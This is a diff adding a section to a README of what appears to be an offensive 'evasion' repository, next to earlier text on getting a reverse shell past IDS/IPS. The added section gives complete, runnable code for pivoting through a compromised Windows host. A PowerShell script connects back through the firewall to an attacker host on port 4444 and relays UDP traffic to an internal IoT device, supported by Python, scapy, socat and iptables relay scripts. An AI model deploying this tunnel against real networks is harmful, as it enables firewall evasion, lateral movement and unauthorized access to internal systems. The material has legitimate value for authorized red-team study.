@@ -685,3 +685,198 @@ Your reverse shell will not complete.<br />
 
 With the modifications, your reverse shell will slip past IDS/IPS.<br />
 ![alt text](https://github.com/billchaison/evasion/blob/master/rs02.png)
+
+## >> PowerShell UDP Proxy
+
+This technique gives an example of tunneling UDP through a TCP session on a Windows host.  There are several components:<br />
+1. A TCP to UDP proxy running on Windows as a Powershell script.
+2. A Linux attack host that is attempting an snmpwalk against an IOT target.
+3. A Linux attack host that is relaying the SNMP traffic between Windows and the other attack host.
+
+The scenario shown here demonstrates how Linux attack hosts that do not have direct access to the IOT target can pivot through a Windows host that does have access to the IOT device.  The scenario is pictured below.  The "Linux 1" host will be set up first, then the Powershell script will be executed on the "Windows" host, which will make a TCP connection back through the firewall to "Linux 1" on port 4444.  Finally the "Linux 2" host will be configured to route traffic to the IOT device's IP address through "Linux 1" and execute an snmpwalk.  This technique has also been tested successfully on other protocols such as DNS.
+
+![alt text](https://github.com/billchaison/evasion/blob/master/udp00.png)
+
+**Set up "Linux 1"**
+
+Create 3 scripts on this host.  The script `udpraw.py` uses scapy to craft raw UDP responses that are sent back to the "Linux 2" host.  The script `responder.sh` uses socat to receive UDP requests sent from the "Linux 2" host and extract the data.  The script `relay.py` is the send/receive bridge between "Linux 1" and the "Windows" host.
+
+Configure routing and iptables NAT rule.<br />
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING  -p udp -i eth0 -d 10.180.151.13 -j DNAT --to-destination 192.168.1.242
+```
+
+Create the `udpraw.py` script.<br />
+```python
+#!/usr/bin/python3
+import sys, getopt
+from scapy.all import *
+nargs = len(sys.argv) - 1
+if nargs != 6:
+    print("supply <interface> <source IP> <source port> <dest IP> <dest port> <data file>")
+    exit(1)
+intfc = sys.argv[1]
+srcip = sys.argv[2]
+srcpo = sys.argv[3]
+dstip = sys.argv[4]
+dstpo = sys.argv[5]
+dfile = sys.argv[6]
+with open(dfile, mode='rb') as file:
+    data = file.read()
+    file.close()
+packet = IP(src = srcip, dst = dstip) / UDP(sport = int(srcpo), dport = int(dstpo)) / Raw(load = data)
+send(packet, iface = intfc)
+exit(0)
+```
+
+Create and execute the `responder.sh` script in one terminal.<br />
+```bash
+#!/usr/bin/bash
+target_host="10.180.151.13"
+target_port="161"
+iface="eth0"
+count=0
+rm /tmp/relay.snd 2>/dev/null
+rm /tmp/relay.rcv 2>/dev/null
+mkfifo /tmp/relay.snd 2>/dev/null
+mkfifo /tmp/relay.rcv 2>/dev/null
+rm /tmp/snmp.log 2>/dev/null
+while true
+do
+   data=$(socat -dd - UDP4-RECVFROM:$target_port 2>/tmp/snmp.log | base64 -w 0)
+   peer=$(cat /tmp/snmp.log | grep "receiving packet from")
+   if [ $? -eq 0 ]
+   then
+      peer=$(echo $peer | rev | cut -d " " -f 1 | rev)
+      peer_addr=$(echo $peer | cut -d ":" -f 1)
+      peer_port=$(echo $peer | cut -d ":" -f 2)
+      packet="$target_host:$target_port:$data"
+      echo $packet >/tmp/relay.snd
+      read -r recv </tmp/relay.rcv
+      echo $recv | base64 -d >/tmp/udp_resp
+      resplen=$(stat -c '%s' /tmp/udp_resp)
+      echo "$count, Sending $resplen byte response to $peer_addr"
+      count=$(($count + 1))
+      /root/udpraw.py $iface $target_host $target_port $peer_addr $peer_port /tmp/udp_resp >/dev/null
+      sleep 0.1
+   else
+      echo "Log parse error"
+   fi
+done
+```
+
+Create and execute the `relay.py` script in another terminal.<br />
+```python
+#!/usr/bin/python3
+import socket
+import sys
+from time import sleep
+host = '0.0.0.0'
+port = 4444
+count = 0
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+   s.bind((host, port))
+   s.listen()
+   conn, addr = s.accept()
+   with conn:
+      print('Connection from', addr)
+      while True:
+         with open('/tmp/relay.snd', "r") as sfifo:
+            while True:
+               sdata = sfifo.read()
+               if len(sdata) != 0:
+                  print(str(count) + ", Relaying " + str(len(sdata)) + " bytes")
+                  count = count + 1
+                  conn.sendall(sdata.encode())
+                  rdata = conn.recv(2048)
+                  if not rdata:
+                     break
+                  resp = rdata.decode("utf-8")
+               try:
+                  with open('/tmp/relay.rcv', "w") as rfifo:
+                     rfifo.write(resp)
+               except IOError as e:
+                     sleep(0.1)
+```
+
+**Set up "Windows"**
+
+Create and execute the `proxy.ps1` script.  This script is set to exit after 60 seconds of inactivity, you may want to raise that value.<br />
+```powershell
+$linhost = "192.168.1.242"
+$linport = "4444"
+$tidle = 0
+$utmout = 1000
+$packet = 1
+try {
+   $tclient = New-Object System.Net.Sockets.TcpClient($linhost, $linport)
+} catch {
+   write-host "Failed to connect to $linhost port $linport"
+   exit
+}
+$strm = $tclient.GetStream()
+$tbuf = New-Object Byte[] $tclient.ReceiveBufferSize
+while($true) {
+   if($tclient.Client.Available -gt 0) {
+      $tidle = 0
+      $trdata = $strm.Read($tbuf, 0, $tbuf.Length)
+      $string = [System.Text.Encoding]::UTF8.GetString($tbuf[0..($trdata - 2)])
+      $arr = $string -split ':'
+      if($arr.Length -eq 3) {
+         $udstip = $arr[0]
+         $udstport = $arr[1]
+         $ubytes = [Convert]::FromBase64String($arr[2])
+         $uclient = new-object System.Net.sockets.udpclient(0)
+         $uclient.Client.ReceiveTimeout = $utmout
+         $ucount = $uclient.send($ubytes, $ubytes.Length, $udstip, $udstport)
+         write-host "Packet "$packet", "$ucount" UDP bytes sent"
+         $ipep = new-object System.Net.ipendpoint([System.Net.IPAddress]::any, 0)
+         try {
+            $urecv = $uclient.receive([ref]$ipep)
+            write-host "Packet  $packet,"$urecv.Length"UDP bytes received"
+            $urdata = [System.Convert]::ToBase64String($urecv)
+            $urdata = "$urdata`n"
+            $enc = [System.Text.Encoding]::UTF8
+            $wbuf = $enc.GetBytes($urdata)
+            $twdata = $strm.Write($wbuf, 0, $wbuf.Length)
+         } catch {
+            write-host "Packet "$packet", nothing received"
+         }
+         $packet++
+         $uclient.close()
+      }
+   } else {
+      Start-Sleep -Milliseconds 10
+      $tidle++
+      if($tidle -gt 6000) {
+         # approx 60 seconds idle close
+         write-host "TCP session timed out"
+         $tclient.Close()
+         break
+      }
+   }
+}
+```
+
+**Set up "Linux 2"**
+
+Configure a static route to the IOT target through "Linux 1".  Execute the snmpwalk command.<br />
+```
+ip route add 10.180.151.13/32 via 192.168.1.242
+snmpwalk -v 2c -c public 10.180.151.13 .1.3.6.1.2.1.1.9.1.4
+```
+
+Output similar to the following whould appear.
+
+"Linux 1"<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/udp01.png)<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/udp02.png)
+
+"Linux 2"<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/udp03.png)<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/udp04.png)
+
+"Windows"<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/udp05.png)
